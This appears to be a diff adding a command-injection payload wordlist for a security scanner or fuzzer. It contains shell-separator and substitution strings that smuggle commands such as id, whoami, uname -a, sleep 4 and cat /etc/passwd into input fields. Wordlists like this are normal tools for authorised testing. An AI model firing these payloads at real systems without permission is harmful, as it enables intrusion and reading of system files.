@@ -1,0 +1,31 @@
+# Command Injection Payloads
+; echo SESAMO_CMD
+| echo SESAMO_CMD
+`echo SESAMO_CMD`
+$(echo SESAMO_CMD)
+; id
+| id
+`id`
+$(id)
+; uname -a
+| uname -a
+`uname -a`
+$(uname -a)
+; whoami
+| whoami
+`whoami`
+$(whoami)
+& echo SESAMO_CMD &
+&& echo SESAMO_CMD
+|| echo SESAMO_CMD
+';echo SESAMO_CMD'
+";echo SESAMO_CMD"
+';id;'
+";id;"
+| echo SESAMO_CMD | cat
+`echo SESAMO_CMD`
+$(cat /etc/passwd)
+; sleep 4
+| sleep 4
+`sleep 4`
+$(sleep 4)
